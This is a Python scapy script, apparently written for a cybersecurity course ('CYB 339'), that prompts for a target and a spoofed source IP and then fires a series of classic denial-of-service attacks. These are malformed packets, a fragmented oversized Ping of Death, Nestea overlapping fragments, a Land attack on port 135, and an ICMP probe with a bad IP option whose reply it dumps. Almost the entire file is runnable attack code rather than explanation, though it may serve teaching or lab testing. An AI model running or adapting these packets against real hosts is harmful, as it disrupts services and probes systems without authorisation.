import FP
import os
import sys
import time
import ipaddress
import re
import scapy
from scapy.all import *

def restart():
	y = 'y'
	n = 'n'
	while True:
		try:
			res = input('Do you want to Restart or Quit the Program? [y - Restart, n - Quit]: ')
			if res == n:
				print(' ')
				print('[!] Shutting Down Program...')
				time.sleep(1)
				print('[!] Returning Home...')
				print('-----')
				print(' ')
				sys.path.insert(0, 'HackTool')
				import FP
				time.sleep(1)
				FP.cTool()
				quit()
			elif res == y:
				print(' ')
				os.system("t17-CA.py")
				print('[!] Restarting Program...')
				print('-----')
				print(' ')
				time.sleep(1)
				main()
				quit()
			else:
				break
			
		except ValueError:
			print(' ')
			print('[!] Please Enter Valid Input!')
			restart()
		else:
			break

def main():
	print('*------------------------------------------*')
	print('*                                          *')
	print('*          JTs Classical Attacks           *')
	print('*                 CYB 339                  *')
	print('*                                          *')
	print('*------------------------------------------*')
	print(' ')
	while True:
		time.sleep(1)
		print(' ')
		print(' \nChoose Target IP Address - Please Enter Valid Target IP: ')
		usrIP = input('Enter Target IP Address - ex. <0.0.0.0>: ')
		try:
			ip_add = ipaddress.ip_address(usrIP)
			print(' ')
			print("You Have Entered a Valid IP Address!! :)")
			print('-----')
			break
		except:
			print(' ')
			print("You Have Entered an Invalid IP Address!! :(")
			print('-----')
	while True:
		time.sleep(1)
		print(' ')
		print('Choose Target Source IP Address - Please Enter Valid Target IP: ')
		sourc = input('Enter Target Source IP Address - ex. <127.0.0.1>: ')
		try:
			ipadd = ipaddress.ip_address(sourc)
			print(' ')
			print("You Have Entered a Valid IP Address!! :)")
			print('-----')
			break
		except:
			print(' ')
			print("You Have Entered an Invalid IP Address!! :(")
			print('-----')

	time.sleep(1)
	print(" \n####################\nMalformed Packets\n ")
	time.sleep(1)
	print(" \n----\nSending Malformed Packets...\n ")
	time.sleep(1)
	send(IP(dst=usrIP, ihl=2, version=3)/ICMP())
	time.sleep(1)
	print(" \n----\n \nDone.\n ")
	time.sleep(1)
	print(' \n-----\nMalformed Packets Complete!\n')
	time.sleep(1)
	
	print(" \n####################\nPing of Death\n ")
	time.sleep(1)
	print(" \n----\nStarting Ping of Death...\n ")
	time.sleep(1)
	send( fragment(IP(dst=usrIP)/ICMP()/("X"*60000)) )
	time.sleep(1)
	print(" \n----\n \nDone.\n ")
	time.sleep(1)
	print(' \n-----\nPing of Death Complete!\n')
	time.sleep(1)
	
	print(" \n####################\nNestea Attacks\n ")
	time.sleep(1)
	print(" \n----\nStarting Nestea Attacks...\n ")
	time.sleep(1)
	print(" \n----\n ")
	send(IP(dst=usrIP, id=42, flags="MF")/UDP()/("X"*10))
	time.sleep(1)
	print(" \n----\n ")
	send(IP(dst=usrIP, id=42, frag=48)/("X"*116))
	time.sleep(1)
	print(" \n----\n ")
	send(IP(dst=usrIP, id=42, flags="MF")/UDP()/("X"*224))
	time.sleep(1)
	print(" \n----\n \nDone.\n ")
	time.sleep(1)
	print(' \n-----\nNestea Attacks Complete!\n')
	time.sleep(1)
	
	print(" \n####################\nLand Attack (designed for Microsoft Windows)\n ")
	time.sleep(1)
	print(" \n----\nStarting Land Attack...\n ")
	time.sleep(1)
	send(IP(src=sourc,dst=usrIP)/TCP(sport=135,dport=135))
	time.sleep(1)
	print(" \n----\n \nDone.\n ")
	time.sleep(1)
	print(' \n-----\nLand Attack Complete!\n')
	time.sleep(1)
	
	print(" \n####################\nICMP Leaking Attack\n ")
	time.sleep(1)
	print(" \n----\nStarting ICMP Leaking...\n ")
	time.sleep(1)
	pkt = sr1(IP(dst=usrIP, options="\x02")/ICMP())
	time.sleep(1)
	print(" \n----\n \nPrinting Packet Information...\n ")
	time.sleep(1)
	print(pkt)
	time.sleep(1)
	print(" \n----\n ")
	print(pkt.show(dump=True))
	time.sleep(1)
	print(" \n----\n \nPrinting Hex, Raw, & Binary Packet Information...\n ")
	time.sleep(1)
	print(" \n----\n \nHex\n ")
	time.sleep(1)
	print(hexdump(pkt))
	time.sleep(1)
	print(" \n----\n \nBinary String (Raw)\n ")
	time.sleep(1)
	pkt_raw = raw(pkt)
	print(pkt_raw)
	time.sleep(1)
	print(" \n----\n \nBase64\n ")
	time.sleep(1)
	print(export_object(pkt))
	time.sleep(1)
	print(" \n----\n \nDone.\n ")
	time.sleep(1)
	print(' \n-----\nICMP Leaking Attack Complete!\n ')
	time.sleep(1)
	restart()
	quit()

if __name__ == '__main__':
	main()



